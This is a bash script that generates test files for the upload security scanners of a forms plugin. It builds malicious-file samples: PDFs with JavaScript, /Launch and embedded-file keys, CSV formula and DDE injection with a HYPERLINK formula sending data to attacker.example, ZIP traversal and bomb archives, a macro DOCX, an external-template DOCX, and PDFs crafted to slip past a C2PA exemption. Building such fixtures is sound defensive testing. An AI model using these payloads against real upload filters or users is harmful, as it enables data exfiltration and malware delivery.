#!/usr/bin/env bash
#
# Generates harmless test files that exercise each scanner in
# src/Validation/FileSecurity/. Run once, then upload each file via a
# public Eightshift Forms file field and verify the matching rejection.
#
# Usage:  ./generate-test-files.sh [output_dir]
#         defaults to ./test-files

set -euo pipefail

# Resolved before the cd below, because the C2PA builders are shared with the
# PHP harnesses and have to be reachable from inside the output directory.
FIXTURES="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/c2pa-fixtures.php"

OUT="${1:-test-files}"
mkdir -p "$OUT"
cd "$OUT"

echo "Generating into: $(pwd)"

# ---------------------------------------------------------------------------
# 1. Extension deny-list (rejected before any content scan).
# Expected label: validationFileExtensionDenied
# ---------------------------------------------------------------------------
echo "harmless content"                       > deny-shell.exe
echo "<?php echo 'not real'; ?>"              > deny-script.php
echo "fake batch"                             > deny-batch.bat
# SVG is in the default deny-list too, so this never reaches the SVG scanner.
echo '<svg><script>alert(1)</script></svg>'   > deny-evil.svg

# ---------------------------------------------------------------------------
# 2. MIME mismatch — .pdf extension but JPEG magic bytes.
# Expected label: validationFileMimeMismatch
# ---------------------------------------------------------------------------
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01' > mime-mismatch.pdf

# ---------------------------------------------------------------------------
# 3. PDF — uncompressed dangerous key (JavaScript autoload).
# Expected label: validationFilePdfUnsafe
# ---------------------------------------------------------------------------
cat > pdf-javascript.pdf <<'EOF'
%PDF-1.4
1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert('test')) >> >> endobj
xref
0 1
0000000000 65535 f
trailer << /Root 1 0 R >>
%%EOF
EOF

# PDF with /Launch action (executes external app on open).
cat > pdf-launch.pdf <<'EOF'
%PDF-1.4
1 0 obj << /Type /Action /S /Launch /F (cmd.exe) >> endobj
xref
0 1
0000000000 65535 f
trailer << /Root 1 0 R >>
%%EOF
EOF

# PDF with /EmbeddedFile (file smuggling).
cat > pdf-embedded.pdf <<'EOF'
%PDF-1.4
1 0 obj << /Type /Filespec /EmbeddedFile 2 0 R >> endobj
xref
0 1
0000000000 65535 f
trailer << /Root 1 0 R >>
%%EOF
EOF

# ---------------------------------------------------------------------------
# 4. CSV — spreadsheet formula injection.
# Expected label: validationFileCsvUnsafe
# ---------------------------------------------------------------------------
cat > csv-formula.csv <<'EOF'
name,note
Alice,=cmd|'/c calc.exe'!A1
Bob,=HYPERLINK("http://attacker.example/log?u="&A1,"Click me")
Carol,@DDE(cmd,/c calc.exe,!)
EOF

# ---------------------------------------------------------------------------
# 5. ZIP — contains a deny-listed executable.
# Expected label: validationFileArchiveUnsafe
# ---------------------------------------------------------------------------
TMP_EXE=$(mktemp -d)/payload.exe
printf 'MZ\x90\x00fake-executable' > "$TMP_EXE"
zip -q archive-with-exe.zip "$TMP_EXE"
rm -rf "$(dirname "$TMP_EXE")"

# ---------------------------------------------------------------------------
# 6. ZIP — path traversal in member name.
# Expected label: validationFileArchiveUnsafe
# ---------------------------------------------------------------------------
python3 - <<'PY'
import zipfile
with zipfile.ZipFile('archive-traversal.zip', 'w') as z:
    z.writestr('../../etc/passwd', 'fake:x:0:0::/root:/bin/sh')
PY

# ---------------------------------------------------------------------------
# 7. ZIP — bomb (compression ratio > 100).
# Expected label: validationFileArchiveUnsafe
# ---------------------------------------------------------------------------
python3 - <<'PY'
import zipfile
data = b'A' * (10 * 1024 * 1024)  # 10 MB of 'A' compresses to a few KB.
with zipfile.ZipFile('archive-bomb.zip', 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('bomb.txt', data)
PY

# ---------------------------------------------------------------------------
# 8. DOCX — macro-bearing (vbaProject.bin entry).
# Expected label: validationFileOfficeUnsafe
# ---------------------------------------------------------------------------
python3 - <<'PY'
import zipfile
with zipfile.ZipFile('office-with-macro.docx', 'w') as z:
    z.writestr('[Content_Types].xml',
        '<?xml version="1.0"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
    z.writestr('word/document.xml',
        '<?xml version="1.0"?><document>hi</document>')
    z.writestr('word/vbaProject.bin', b'fake-macro-bytes')
PY

# DOCX with external-target relationship (template / DDE injection vector).
python3 - <<'PY'
import zipfile
rels = (
    '<?xml version="1.0"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
    'Target="http://attacker.example/payload.dotm" TargetMode="External"/>'
    '</Relationships>'
)
with zipfile.ZipFile('office-external-rel.docx', 'w') as z:
    z.writestr('[Content_Types].xml',
        '<?xml version="1.0"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
    z.writestr('word/_rels/document.xml.rels', rels)
PY

# ---------------------------------------------------------------------------
# 9. TXT — smuggled PHP open tag.
# Expected label: validationFileTextUnsafe
# ---------------------------------------------------------------------------
cat > text-php.txt <<'EOF'
This looks like an innocent text file.
<?php echo 'should never reach disk'; ?>
EOF

# TXT — shell script shebang.
cat > text-shebang.txt <<'EOF'
#!/bin/bash
echo "this is not a text file"
EOF

# ---------------------------------------------------------------------------
# 10. JPEG — truncated / unparseable.
# Expected label: validationFileImageUnsafe
# ---------------------------------------------------------------------------
# Valid magic bytes but no real image data → getimagesize() returns false.
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > image-broken.jpg

# ---------------------------------------------------------------------------
# 11. EICAR — standard non-malicious AV test signature. Only triggers when
# the es_forms_validation_file_security_external_scanner filter is wired
# to ClamAV. The structural scanners ignore it.
# Expected label (when ClamAV is wired): validationFileAntivirus
# ---------------------------------------------------------------------------
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.txt

# ---------------------------------------------------------------------------
# 12. CLEAN baseline — should pass every layer.
# Expected: upload succeeds.
# ---------------------------------------------------------------------------
cat > clean.txt <<'EOF'
Plain text, nothing interesting, used as a sanity check.
EOF

# Minimal valid one-page PDF with no dangerous keys.
cat > clean.pdf <<'EOF'
%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000053 00000 n
0000000100 00000 n
trailer << /Size 4 /Root 1 0 R >>
startxref
160
%%EOF
EOF

# ---------------------------------------------------------------------------
# C2PA Content Credentials cases.
#
# A C2PA manifest store is a JUMBF tree (ISO/IEC 19566-5). Every box is a BE32
# length covering its own 8-byte header, a 4-byte type, then contents. The
# store is a 'jumb' superbox whose first child is a 'jumd' description carrying
# the registered C2PA UUID, followed by 'jumb' manifest superboxes.
#
# The verifier requires those boxes to tile the payload exactly, so these are
# built by a real encoder rather than hand-written hex: a payload with a single
# byte of slack is a reject, which is the whole point of the check.
# ---------------------------------------------------------------------------

# Emits a complete, well-formed C2PA manifest store on stdout. The box builders
# live in c2pa-fixtures.php, shared with verify-c2pa.php and
# verify-pdf-scanner.php, so a fixture can never drift from what the harnesses
# assert against.
c2pa_payload() {
  php -r 'require $argv[1]; echo C2paFixtures::store();' "$FIXTURES"
}

C2PA_LEN=$(c2pa_payload | wc -c | tr -d ' ')

c2pa_tail() {
  printf '6 0 obj << /Type /Pages /Kids [7 0 R] /Count 1 >> endobj\n'
  printf '7 0 obj << /Type /Page /Parent 6 0 R /MediaBox [0 0 612 792] >> endobj\n'
  printf 'trailer << /Size 8 /Root 1 0 R >>\n%%%%EOF\n'
}

# Genuine manifest — EXPECTED TO BE ACCEPTED when the exemption is enabled.
{
  printf '%%PDF-1.4\n'
  printf '1 0 obj << /Type /Catalog /Pages 6 0 R /AF [2 0 R] /Names << /EmbeddedFiles << /Names [(Content Credentials) 2 0 R] >> >> >> endobj\n'
  printf '2 0 obj << /Type /FileSpec /AFRelationship /C2PA_Manifest /F (Content Credentials) /EF << /F 3 0 R >> /Subtype (application/c2pa) >> endobj\n'
  printf '3 0 obj << /Length %s >>\nstream\n' "$C2PA_LEN"
  c2pa_payload
  printf '\nendstream endobj\n'
  c2pa_tail
} > pdf-c2pa-valid.pdf

# Correct labels, wrong bytes — EXPECTED TO BE REJECTED.
# This is the attack the exemption must stop.
{
  printf '%%PDF-1.4\n'
  printf '1 0 obj << /Type /Catalog /Pages 6 0 R /AF [2 0 R] /Names << /EmbeddedFiles << /Names [(Content Credentials) 2 0 R] >> >> >> endobj\n'
  printf '2 0 obj << /Type /FileSpec /AFRelationship /C2PA_Manifest /F (Content Credentials) /EF << /F 3 0 R >> /Subtype (application/c2pa) >> endobj\n'
  printf '3 0 obj << /Length 64 >>\nstream\n'
  printf 'MZ\x90\x00This is where an executable payload would sit, mislabelled.\x00\x00'
  printf '\nendstream endobj\n'
  c2pa_tail
} > pdf-c2pa-mislabelled.pdf

# A real ZIP with a plausible JUMBF header glued in front — EXPECTED TO BE
# REJECTED. The header alone satisfies a shallow "does this start with a C2PA
# superbox" check, while unzip ignores the prefix and extracts the member
# regardless, so only tiling the whole payload catches it.
php -r 'require $argv[1]; echo C2paFixtures::prefixedBlob(file_get_contents($argv[2]));' \
  "$FIXTURES" archive-with-exe.zip > c2pa-prefixed.bin

PREFIXED_LEN=$(wc -c < c2pa-prefixed.bin | tr -d ' ')

{
  printf '%%PDF-1.4\n'
  printf '1 0 obj << /Type /Catalog /Pages 6 0 R /AF [2 0 R] /Names << /EmbeddedFiles << /Names [(Content Credentials) 2 0 R] >> >> >> endobj\n'
  printf '2 0 obj << /Type /FileSpec /AFRelationship /C2PA_Manifest /F (Content Credentials) /EF << /F 3 0 R >> /Subtype (application/c2pa) >> endobj\n'
  printf '3 0 obj << /Length %s >>\nstream\n' "$PREFIXED_LEN"
  cat c2pa-prefixed.bin
  printf '\nendstream endobj\n'
  c2pa_tail
} > pdf-c2pa-prefixed-zip.pdf

rm -f c2pa-prefixed.bin

# Genuine manifest PLUS an ordinary attachment — EXPECTED TO BE REJECTED.
{
  printf '%%PDF-1.4\n'
  printf '1 0 obj << /Type /Catalog /Pages 6 0 R /Names << /EmbeddedFiles << /Names [(Content Credentials) 2 0 R (notes.txt) 4 0 R] >> >> >> endobj\n'
  printf '2 0 obj << /Type /FileSpec /AFRelationship /C2PA_Manifest /EF << /F 3 0 R >> >> endobj\n'
  printf '3 0 obj << /Length %s >>\nstream\n' "$C2PA_LEN"
  c2pa_payload
  printf '\nendstream endobj\n'
  printf '4 0 obj << /Type /FileSpec /EF << /F 5 0 R >> >> endobj\n'
  printf '5 0 obj << /Length 10 >>\nstream\nplain text\nendstream endobj\n'
  c2pa_tail
} > pdf-c2pa-mixed.pdf

# Genuine manifest PLUS JavaScript — EXPECTED TO BE REJECTED (the exemption must
# not apply when any other dangerous key matched).
{
  printf '%%PDF-1.4\n'
  printf '1 0 obj << /Type /Catalog /Pages 6 0 R /AF [2 0 R] /Names << /EmbeddedFiles << /Names [(Content Credentials) 2 0 R] >> >> /OpenAction 8 0 R >> endobj\n'
  printf '2 0 obj << /Type /FileSpec /AFRelationship /C2PA_Manifest /F (Content Credentials) /EF << /F 3 0 R >> /Subtype (application/c2pa) >> endobj\n'
  printf '3 0 obj << /Length %s >>\nstream\n' "$C2PA_LEN"
  c2pa_payload
  printf '\nendstream endobj\n'
  printf '8 0 obj << /S /JavaScript /JS (app.alert\050 1 \051) >> endobj\n'
  c2pa_tail
} > pdf-c2pa-plus-js.pdf

# ---------------------------------------------------------------------------
# 13. PDF — dangerous key inside a compressed object stream, in a file qpdf
# warns about. EXPECTED TO BE REJECTED.
#
# /JavaScript is invisible to the raw byte scan because it lives inside a
# FlateDecode'd /ObjStm, so only the qpdf expansion can see it. The stream at
# object 7 carries a deliberately wrong /Length, which makes qpdf recover the
# real length and exit 3 — "output produced, with warnings" — rather than 0.
# Treating exit 3 as failure discards that expansion and accepts this file.
#
# The cross-reference has to stay a valid xref *stream*: a classic xref table
# cannot address objects inside an /ObjStm, and damaging startxref instead
# makes qpdf reconstruct the table, which drops those objects entirely and
# would let the fixture pass for the wrong reason.
# Expected label: validationFilePdfUnsafe
# ---------------------------------------------------------------------------
python3 - <<'OBJSTM_PY'
import zlib

# Objects 4 and 5 are stored inside the compressed object stream.
inner = [
    (4, b'<< /S /JavaScript /JS (app.alert\x28 1 \x29) >>'),
    (5, b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>'),
]

pairs, body = [], b''
for num, data in inner:
    pairs.append(b'%d %d' % (num, len(body)))
    body += data + b' '

first = b' '.join(pairs) + b'\n'
objstm = zlib.compress(first + body)

out = b'%PDF-1.5\n'
offsets = {}


def add(num, data):
    global out
    offsets[num] = len(out)
    out += b'%d 0 obj ' % num + data + b' endobj\n'


add(1, b'<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>')
add(2, b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>')
add(3, b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 7 0 R'
       b' /Resources << /Font << /F1 5 0 R >> >> >>')
add(6, b'<< /Type /ObjStm /N %d /First %d /Length %d /Filter /FlateDecode >>\nstream\n'
       % (len(inner), len(first), len(objstm)) + objstm + b'\nendstream')

# Wrong /Length: qpdf scans for endstream, recovers, and warns.
content = b'BT /F1 12 Tf 72 720 Td (hello) Tj ET'
add(7, b'<< /Length 5 >>\nstream\n' + content + b'\nendstream')

xref_offset = len(out)
rows = [bytes([0]) + (0).to_bytes(2, 'big') + (65535).to_bytes(2, 'big')]
for n in range(1, 9):
    if n in (4, 5):
        # Type 2: lives in object stream 6, at this index.
        rows.append(bytes([2]) + (6).to_bytes(2, 'big') + (n - 4).to_bytes(2, 'big'))
    else:
        at = xref_offset if n == 8 else offsets[n]
        rows.append(bytes([1]) + at.to_bytes(2, 'big') + (0).to_bytes(2, 'big'))

xref = zlib.compress(b''.join(rows))
out += (b'8 0 obj << /Type /XRef /Size 9 /W [1 2 2] /Root 1 0 R /Filter /FlateDecode'
        b' /Length %d >>\nstream\n' % len(xref)) + xref + b'\nendstream endobj\n'
out += b'startxref\n%d\n%%%%EOF\n' % xref_offset

assert b'/JavaScript' not in out, 'the key must not be visible to the raw scan'
open('pdf-objstm-qpdf-warning.pdf', 'wb').write(out)
OBJSTM_PY

echo
echo "Done. Files generated in: $(pwd)"
ls -la
